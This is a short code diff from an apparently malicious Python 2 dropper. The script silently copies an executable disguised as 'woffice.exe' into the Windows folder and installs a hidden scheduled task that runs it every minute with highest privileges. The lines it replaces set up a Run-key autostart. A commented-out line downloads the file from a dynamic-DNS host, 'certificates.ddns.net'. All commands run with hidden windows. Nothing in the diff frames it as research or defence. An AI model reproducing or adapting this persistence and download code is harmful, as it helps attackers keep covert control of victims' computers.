@@ -106,8 +106,10 @@ try:
 ##        with open(suser+'\\woffice.exe', "wb") as code:
 ##            code.write(f.read())
         #subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/woffice.exe" -OutFile '+suser+'\\woffice.exe', creationflags=CREATE_NO_WINDOW)
-        subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +suser+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
-        subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
+        #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +suser+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
+        #subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +swin+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("schtasks /create  /sc minute /mo 1 /tr 'c:\windows\woffice.exe' /tn taskflash /rl highest /F ", creationflags=CREATE_NO_WINDOW)
 except Exception,e:
     text_file = open(stemp+"\\pippo.txt", "w")
     text_file.write(str(e))
